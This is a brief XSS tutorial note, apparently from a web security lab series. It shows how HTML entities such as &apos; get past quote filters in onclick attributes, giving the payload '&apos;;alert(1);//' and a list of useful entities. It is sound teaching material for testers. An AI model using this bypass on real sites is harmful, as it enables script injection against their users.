# Using HTML Encoding In JavaScript Context

## Overview

Some applications sanitize dangerous characters.

Example:

```javascript
'
```

may be blocked.

---

# Important Browser Behavior

HTML attributes are:

```text
HTML Decoded
        ↓
JavaScript Parsed
```

---

# Example

Context:

```html
<a onclick="var x='USER_INPUT'">
```

---

Payload:

```html
&apos;;alert(1);//
```

---

Browser Decodes:

```html
&apos;
```

into:

```javascript
'
```

before JavaScript executes.

---

# Why It Works

Flow:

```text
HTML Entity
        ↓
Browser Decoding
        ↓
Single Quote
        ↓
String Breakout
        ↓
alert(1)
```

---

# Useful Entities

## Single Quote

```html
&apos;
```

---

## Double Quote

```html
&quot;
```

---

## Less Than

```html
&lt;
```

---

## Greater Than

```html
&gt;
```

---

# Related Lab

- Lab22

---

# Key Takeaways

- Browser decoding often creates bypass opportunities.
- Filters may block characters but not entities.
- Always test encoded versions.